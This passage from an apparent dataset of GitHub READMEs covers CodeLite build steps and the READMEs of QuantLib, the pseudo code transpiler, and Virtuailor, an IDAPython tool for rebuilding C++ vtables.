- (Optional) Upgrade Homebrew packages: `brew upgrade`\n - Install Git: `brew install git`\n - Install CMake: `brew install cmake`\n - Install wxWidgets: `brew install wxmac --dev --use-llvm`\n\n\nClone the repo (lets assume that you have a folder `/Users/YOU/src`)\n\n  ```bash\n  cd /Users/YOU/src\n  git clone https://github.com/eranif/codelite.git\n  ```\n the above will create the folder `/Users/YOU/codelite`\n\n To build CodeLite:\n\n  ```bash\n  cd /Users/YOU/codelite\n  mkdir build-release\n  cd build-release\n  cmake .. -DCMAKE_BUILD_TYPE=Release\n  cmake --build . -j $(sysctl -n hw.physicalcpu)\n  cmake --build . --target install\n  ```\n\nYou should now have an app bundle `/Users/YOU/codelite/build-release/codelite.app`\n\nTo launch CodeLite:\n\n`open /Users/YOU/codelite/build-release/codelite.app`\n\n----------\n\nBuilding CodeLite on Windows\n----\n\nGit clone the sources:\n\n    git clone https://github.com/eranif/codelite.git\n\n - Download CodeLite installer for Windows from our [Download Page][8]\n - Build wxWidgets 3.1 or later. See build instructions [here][7]\n - Open the workspace **CodeLiteIDE.workspace** (located in the CodeLite's folder)\n - Make sure that the project **CodeLiteIDE** is selected (the active project uses **bold** font)\n - Select the **Win_x64_Release** or **Win_x86_Release** (depending if you want to build a 32 or 64 bit version of CodeLite) and hit **F7**\n - When the compilation is over, close the workspace\n - Next, locate the workspace **codelite_utils/codelite_utils.workspce** and open it\n - Select the **Win_x64_Release** or **Win_x86_Release** (depending if you want to build a 32 or 64 bit version of CodeLite), hit **F7** and wait for the compilation to end\n - Close CodeLite\n - To update your installation with the new CodeLite, close CodeLite and from a cmd.exe window navigate to codelite-sources/Runtime/ and run the file **update64.bat** OR **update.bat** (again, depending on your selected arch).\n\n  [1]: https://codelite.org\n  [2]: https://codelite.org/support.php\n  [3]: https://codelite.org\n  [4]: https://codelite.org/support.php\n  [5]: https://wiki.codelite.org/pmwiki.php\n  [6]: https://wiki.codelite.org/pmwiki.php/Main/WxWidgets31Binaries\n  [7]: https://wiki.codelite.org/pmwiki.php/Developers/BuildingWxWidgetsWin\n  [8]: https://codelite.org/support.php\n"}, {"repo": "/lballabio/QuantLib", "language": "C++", "readme_contents": "\n# QuantLib: the free/open-source library for quantitative finance\n\n[![Download](https://api.bintray.com/packages/quantlib/releases/QuantLib/images/download.svg)](https://bintray.com/quantlib/releases/QuantLib/_latestVersion)\n[![Licensed under the BSD 3-Clause License](https://img.shields.io/badge/License-BSD--3--Clause-blue.svg)](https://github.com/lballabio/QuantLib/blob/master/LICENSE.TXT)\n[![DOI](https://zenodo.org/badge/DOI/10.5281/zenodo.1440997.svg)](https://doi.org/10.5281/zenodo.1440997)\n[![PRs Welcome](https://img.shields.io/badge/PRs%20-welcome-brightgreen.svg)](#contributing)\n\n[![Build Status](https://travis-ci.org/lballabio/QuantLib.svg?branch=master)](https://travis-ci.org/lballabio/QuantLib)\n[![Build status](https://ci.appveyor.com/api/projects/status/bmpiucu74eldfkm0/branch/master?svg=true)](https://ci.appveyor.com/project/lballabio/quantlib/branch/master)\n[![Codacy Badge](https://api.codacy.com/project/badge/Grade/b4bc1058db994f24aa931b119a885eea)](https://www.codacy.com/app/lballabio/QuantLib)\n[![Code Quality: Cpp](https://img.shields.io/lgtm/grade/cpp/g/lballabio/QuantLib.svg?logo=lgtm&logoWidth=18)](https://lgtm.com/projects/g/lballabio/QuantLib/context:cpp)\n[![codecov](https://codecov.io/gh/lballabio/QuantLib/branch/master/graph/badge.svg)](https://codecov.io/gh/lballabio/QuantLib)\n\n---\n\nThe QuantLib project (<http://quantlib.org>) is aimed at providing a\ncomprehensive software framework for quantitative finance. QuantLib is\na free/open-source library for modeling, trading, and risk management\nin real-life.\n\nQuantLib is Non-Copylefted Free Software and OSI Certified Open Source\nSoftware.\n\n\n## Download and usage\n\nQuantLib can be downloaded from <http://quantlib.org/download.shtml>;\ninstallation instructions are available at\n<http://quantlib.org/install.shtml> for most platforms.\n\nDocumentation for the usage and the design of the QuantLib library is\navailable from <http://quantlib.org/docs.shtml>.\n\nA list of changes for each past versions of the library can be\nbrowsed at <http://quantlib.org/reference/history.html>.\n\n\n## Questions and feedback\n\nThe preferred channel for questions (and the one with the largest\naudience) is the quantlib-users mailing list.  Instructions for\nsubscribing are at <http://quantlib.org/mailinglists.shtml>.\n\nBugs can be reported as a GitHub issue at\n<https://github.com/lballabio/QuantLib/issues>; if you have a patch\navailable, you can open a pull request instead (see \"Contributing\"\nbelow).\n\n\n## Contributing\n\nThe preferred way to contribute is through pull requests on GitHub.\nGet a GitHub account if you don't have it already and clone the\nrepository at <https://github.com/lballabio/QuantLib> with the \"Fork\"\nbutton in the top right corner of the page. Check out your clone to\nyour machine, code away, push your changes to your clone and submit a\npull request; instructions are available at\n<https://help.github.com/articles/fork-a-repo>.\n\nIn case you need them, more detailed instructions for creating pull\nrequests are at\n<https://help.github.com/articles/using-pull-requests>, and a basic\nguide to GitHub is at\n<https://guides.github.com/activities/hello-world/>.  GitHub also\nprovides interactive learning at <https://lab.github.com/>.\n\nIt's likely that we won't merge your code right away, and we'll ask\nfor some changes instead. Don't be discouraged! That's normal; the\nlibrary is complex, and thus it might take some time to become\nfamiliar with it and to use it in an idiomatic way.\n\nWe're looking forward to your contributions.\n\n"}, {"repo": "/pseudo-lang/pseudo", "language": "Python", "readme_contents": "[![Build Status](https://travis-ci.org/alehander42/pseudo.svg?branch=master)](https://travis-ci.org/alehander42/pseudo)\n[![codecov.io](https://codecov.io/github/alehander42/pseudo/coverage.svg?branch=master)](https://codecov.io/github/alehander42/pseudo?branch=master)\n[![MIT License](http://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)\n\n# pseudo\n\n[![Join the chat at https://gitter.im/alehander42/pseudo](https://badges.gitter.im/alehander42/pseudo.svg)](https://gitter.im/alehander42/pseudo?utm_source=badge&utm_medium=badge&utm_campaign=pr-badge&utm_content=badge)\n\nPseudo takes an algorithm / a simple program and generates idiomatic code for it in Python, JavaScript, C#, Go and Ruby.\n\nPseudo achieves that with translation on two layers: it uses the target language syntax and it can express standard library methods/api of language X using language Y's native standard library\n\nPseudo consumes \"Pseudo AST\" which corresponds to a very clear, statically typed and somehow limited subset of a language:\n\n  * basic types and collections and standard library methods for them\n  \n  * integer, float, string, boolean\n  * lists\n  * dicts\n  * sets\n  * tuples/structs(fixed length heterogeneous lists)\n  * fixed size arrays\n  * regular expressions\n\n  * functions with normal parameters (no default/keyword/vararg parameters)\n  * classes \n    * single inheritance\n    * polymorphism\n    * no dynamic instance variables\n    * basically a constructor + a collection of instance methods, no fancy metaprogramming etc supported\n\n  * exception-based error handling with support for custom exceptions\n  (target languages support return-based error handling too)\n  \n  * I/O: print/input, file read/write, command arg handling, system and subprocess commands\n\n  * iteration (for-in-range / for-each / iterating over several collections / while)\n  * conditionals (if / else if / else)\n  * standard math/logical operations\n\n  * a lot more in future\n\n[standard library reference](docs/library_reference.md)\n\n\nThose constructs and entities have almost the same behavior and very same-spirited api in a lot of the languages which Pseudo would support.\n\n## examples\n\nEach example contains a detailed README and working translations to Python, JS, Ruby, Go and C#, generated by Pseudo\n\n[fibonacci](examples/fib)\n\n[a football results processing command line tool](examples/football)\n\n[a verbal expressions-like library ported to all the target languages](examples/verbal_expressions)\n\n### architecture\n\n```ruby\nPSEUDO AST:\n   NORMAL CODE     PSEUDO STANDARD LIBRARY INVOCATIONS     \n      ||                    ||\n      ||                    ||\n      ||              API TRANSLATOR\n      ||                    ||\n      ||                    ||\n      ||                    \\/\n      ||              IDIOMATIC TARGET LANGUAGE \n      ||              STANDARD LIBRARY INVOCATIONS        \n      ||                    ||     \n      \\/                    \\/\n  STANDARD OR LANGUAGE-SPECIFIC MIDDLEWARES\n              e.g.\n    name camel_case/snake_case middleware\n    convert-tuples-to-classes middleware\n    convert-exception-based errors handling\n    to return-based error handling middleware\n              etc\n\n              ||\n              ||\n              ||\n              ||\n  TARGET LANGUAGE CODE GENERATOR\n\n      defined with a dsl aware\n      that handles formatting\n         automatically\n              ||\n              ||\n              ||\n              \\/\n\n      Python / C# / Go / JS / Ruby\n```\n\n\n## use cases\n\n  * generate code for the same task/algorithm in different languages (parser generators etc)\n  * port a library/codebase\n  * develop core logic in one language and use it in other language codebases\n  * write a compiler/dsl\n  * bootstrap a codebase in another language / generate equivalent test suites in different languages\n  * translate/support some algorithms in different languages\n  * translate/support some text/data processing/command tool in different languages\n\n## installation\n\n```bash\npip install pseudo #only python 3 supported\n\n# probably you'd like to try the python-to-pseudo-to-js/go/etc compiler\npip install pseudo-python\n```\n\n- [usage](#usage)\n- [why?](#why)\n- [language support](#language-support)\n- [compilers targetting pseudo](#compilers-targetting-pseudo)\n- [implementation](#implementation)\n- [roadmap](#roadmap)\n- [target language specific docs](#target-language-specific-docs)\n- [Pseudo and Haxe?](#pseudo-and-haxe)\n- [the name?](#the-name)\n\n\n## usage\n\nyou can directly generate pseudo ast from Python using Pseudo-Python\n```bash\npseudo-python a.py # generates a.pseudo.yaml\n```\nand then translate the ast\n```bash\npseudo a.pseudo.yaml go # or ruby / js / csharp / py / cpp\n```\nor you can directly translate from python to another language\n\n```bash\npseudo-python a.py b.rb # or c.cs\n```\n\n\n\n```python\npseudo.generate(pseudo_ast, language) # pseudo_ast is a plain dict or a pseudo Node-based tree\n```\n\n```python\npseudo.generate_from_yaml(pseudo_ast, language) # pseudo_ast is yaml-encoded pseudo ast\n```\n\nFor quick experiments it's easier to use `generate_main`\n\n```python\nfrom pseudo import * # ok for a repl\n\nprint(generate_main([\n  assignment(\n    local('a', 'Int'),\n    call(local('g'), [to_node(0), to_node('')], 'Int'))], 'rb'))\n\na = g(0, '')\n```\n\nIn the future Pseudo can add a lisp-like dsl for fast manual creation of ast nodes, but currently it's more useful for its main goal: consuming automatically generated pseudo ast and then transpiling it to the target languages.\n\n\n## why?\n\nSupporting full-blown Ruby to Python/Javascript to C++ auto translation is hard.\n\nHowever often we need to just express an algorithm, a self-contained core of a library, a simple command line tool and the act of manual porting to another languages feels somehow .. primitive. \n\nOften that code is(or can be) expressed in very similar way, with\nsimilar constructs and basic types and data structures. On that level a lot of languages are very similar and the only real difference is syntax and methods api. That's a feasible task for automatic translation and actually the existance of `pseudo` is to fullfill the needs of several other existing projects/ideas.\n\nAnother powerful thing about Pseudo is its standard library.\nIt can accumulate a serious number of methods/idioms and it can act like e.g. a truly cross-platform, target-language-aware equivalent of lodash\n\nPseudo is still young (it's basically less than two weeks old), \nbut it already has a base on which it can improve really quickly\n(adding support for another language is basically just a matter of 3-4 hours currently)\n\n## Language support\n\nUsing pseudo's DSL it's easy to add support for a new language, so it's feasible to expect support for most popular languages and even different versions of them (e.g. EcmaScript 6/7, Perl 5/6 Java 7 / 8)\n\n## Compilers targetting pseudo\n\nCurrently [pseudo-python](https://github.com/alehander42/pseudo-python) is usable, and there are plans for `pseudo-ruby` or `pseudo-js`\n\n## Intermediate AST format\n\nThe AST format uses basic data structures available in most languages. The nodes correspond to \ndictionaries with `type` key corresponding to the node type and `field_name` keys corresponding to\nthe node fields, similar to the widely popular `estree` ecmascript format.\n\nPseudo can consume ast either serialized in `.pseudo.yaml` files or directly as\ndictionary objects through it's `pseudo.generate(ast, output_lang)` API\n\n## Implementation\n\n\n\nThe implementation goal is to make the definitions of new supported languages  really clear and simple. \n\nIf you dive in, you'll find out\na lot of the code/api transformations are defined using a declarative dsl with rare ocassions \nof edge case handling helpers. \n\nThat has a lot of advantages:\n\n* Less bugs: the core transformation code is really generalized, it's reused as a dsl and its results are well tested\n\n* Easy to comprehend: it almost looks like a config file\n\n* Easy to add support for other languages: I was planning to support just python and c# in the initial version but it is so easy to add support for a language similar to the current supported ones, that I\nadded support for 4 more.\n\n* Easy to test: there is a simple test dsl too which helps all \nlanguage tests to share input examples [like that](tests/test_ruby.py)\n\nHowever language translation is related to a lot of details and\na lot of little gotchas, tuning and refining some of them took days. Pseudo uses different abstractions to streamline the process and to reuse logic across languages.\n\n```ruby\nPSEUDO AST:\n   NORMAL CODE     PSEUDO STANDARD LIBRARY INVOCATIONS     \n      ||                    ||\n      ||                    ||\n      ||              API TRANSLATOR\n      ||                    ||\n      ||                    ||\n      ||                    \\/\n      ||              IDIOMATIC TARGET LANGUAGE \n      ||              STANDARD LIBRARY INVOCATIONS        \n      ||                    ||     \n      \\/                    \\/\n  STANDARD OR LANGUAGE-SPECIFIC MIDDLEWARES\n              e.g.\n    name camel_case/snake_case middleware\n    convert-tuples-to-classes middleware\n    convert-exception-based errors handling\n    to return-based error handling middleware\n              etc\n\n              ||\n              ||\n              ||\n              ||\n  TARGET LANGUAGE CODE GENERATOR\n\n      defined with a dsl aware\n      that handles formatting\n         automatically\n              ||\n              ||\n              ||\n              \\/\n\n            OUTPUT\n```\n\n\n\n## Roadmap\n\nPseudo has undergone some changes through the last year in my local repo, the new release somewhere in the next months should contain some of this roadmap.\n\n[Roadmap](roadmap.md)\n\n## Target language specific docs\n\n* [python](docs/python.md)\n* [c#](docs/csharp.md)\n* [go](docs/go.md)\n* [ruby](docs/ruby.md)\n* [javascript](docs/javascript.md)\n* [c++](docs/cpp.md)\n\n## Pseudo and Haxe\n\nThey might seem comparable at a first glance, but they have completely different goals.\n\nPseudo wants to generate readable code, ideally something that looks like a human wrote it/ported it\n\nPseudo doesn't use a target language runtime, it uses the target language standard library for everything (except for JS, but even there is uses `lodash` which is pretty popular and standard)\n\nPseudo's goal is to help with automated translation for cases\nlike algorithm generation, parser generation, refactoring, porting codebases etc. The fact that you can write compilers targetting Pseudo and receiver translation to many languages for free is just a happy accident\n\n## The name?\n\nwell.\n\npseudo(code)\n\n\n## License\n\nCopyright \u00a9 2015 2016 [Alexander Ivanov](https://twitter.com/alehander42)\n\nDistributed under the MIT License.\n"}, {"repo": "/0xgalz/Virtuailor", "language": "Python", "readme_contents": "# Virtuailor - IDAPython tool for C++ vtables reconstruction \n\n\nVirtuailor is an IDAPython tool that reconstructs vtables for C++ code written for intel architecture, both 32bit and 64bit code and AArch64 (New!).\nThe tool constructed from 2 parts, static and dynamic.\n\nThe first is the static part, contains the following capabilities:\n* Detects indirect calls.\n* Hooks the value assignment of the indirect calls using conditional breakpoints (the hook code). \n\nThe second is the dynamic part, contains the following capabilities:\n* Creates vtable structures. \n* Rename functions and vtables addresses.\n* Add structure offset to the assembly indirect calls. \n* Add xref from indirect calls to their virtual functions(multiple xrefs).\n* For AArch64- tries to fix undefined vtables and related virtual functions (support for firmware).\n\n## How to Use?\n\n1. By default Virtuailor will look for virtual calls in ALL the addresses in the code.\nIf you want to limit the code only for specific address range, no problem, just edit the *Main* file to add the range you want to target in the variables start_addr_range and end_addr_range:\n\n```python\nif __name__ == '__main__':\n\n    start_addr_range = idc.MinEA()  # You can change the virtual calls address range\n    end_addr_range = idc.MaxEA()\n    add_bp_to_virtual_calls(start_addr_range, end_addr_range)\n```\n\n2. Optional, (but extremely recommended), create a snapshot of your idb. Just press ctrl+shift+t and create a snapshot.\n\n3. Press File->Run script... then go to Virtuailor folder and choose to run Main.py, You can see the following gif for a more clear and visual explanation.\n![How to use](https://github.com/0xgalz/Virtuailor/blob/master/Images/howto.gif)\n\nNow the GUI will provide you an option to choose a range to target, in case you would like to target all the binary just press OK with the default values in the start and end addresses. \n\nAfterwards the breakpoints will be placed in your code and all you have to do is to execute your code with IDA debugger, do whatever actions you want and see how the vtables is being built! \nFor AArch64 you can setup a remote gdb server and debug using the IDA debuggger.\n\nIn case you don't want/need the breakpoints anymore just go to the breakpoint list tab in IDA and delete the breakpoints as you like.\n\nIt is also really important for me to note that this is the second version of the tool with both 32 and 64 bit support and aarch64, probably in some cases a small amount of breakpoints will be missed, in these cases please open an issue and contact me so I will be able to improve the code and help fixing it. Thank you in advanced for that :)\n\n## Output and General Functions\n\n#### vtables structures\nThe structures Virtuailor creates from the vtable used in virtual call that were hit. The vtable functions are extracted from the memory based on the relevant register that was used in the BP opcode.\n\n![vtable example](https://github.com/0xgalz/Virtuailor/blob/master/Images/vtable_structure.png)\nSince I wanted to create a correlation between the structure in IDA and the vtables in the data section, the BP changes the vtable address name in the data section to the name of the structure. As you can see in the following picture:\n![vtable example](https://github.com/0xgalz/Virtuailor/blob/master/Images/vtable_in_memory.png)\n\nThe virtual functions names are also being changed, take aside situations where the names are not the default IDA names (functions with symbols or functions that the user changed) in those cases the function names will stay the same and will also be add to the vtable structure with their current name.\n\nThe chosen names is constructed using the following pattern: \n* vtable_ \n* vfunc_\nthe rest of the name is either offset from the beginning of the Segment, this is mostly because most binaries nowadays are PIE and PIC and thus ASLR is enforced, (instead of using the full address name, which is also quite long on 64bit environments).\nThe vtable structure also has a comment, \"Was called from offset: XXXX\", this offset is the offset from the beginning of the Segment.\n\n#### Adding Structures to the Assembly\n\nAfter creating the vtable Virtuailor also adds a connection between the structure created and the assembly as you can see in the following images:\n![BP after an execution, Example 2](https://github.com/0xgalz/Virtuailor/blob/master/Images/stroff2.png)\n\nP.S: The structure offset used in the BP is only relevant for the last call that was made, in order to get a better understanding of all the virtual calls that were made the xref feature was added as explained in the next section\n\n#### Xref to virtual functions\n\nWhen reversing C++ statically it is not trivial to see who called who, this is because most calls are indirect calls, however after running Virtuailor every function that was called indirectly now has an xref to those locations.\n\nThe following gif shows the added Xrefs with their indirect function call:\n\n![xref](https://github.com/0xgalz/Virtuailor/blob/master/Images/xref.gif)\n\n## Former talks and lectures \n\nThe tool was presented in RECon brussels, Troopers and Warcon. \nThe presentation could be found in the following link: https://www.youtube.com/watch?v=Xk75TM7NmtA\n\n## Thanks\n\nREcon Brussels, Troopers, Warcon crews, Nana, @tmr232, @matalaz, @oryandp, @talkain, @shiftreduce\n\n\n## License\n\nThe plugin is licensed under the GNU GPL v3 license.\n"}]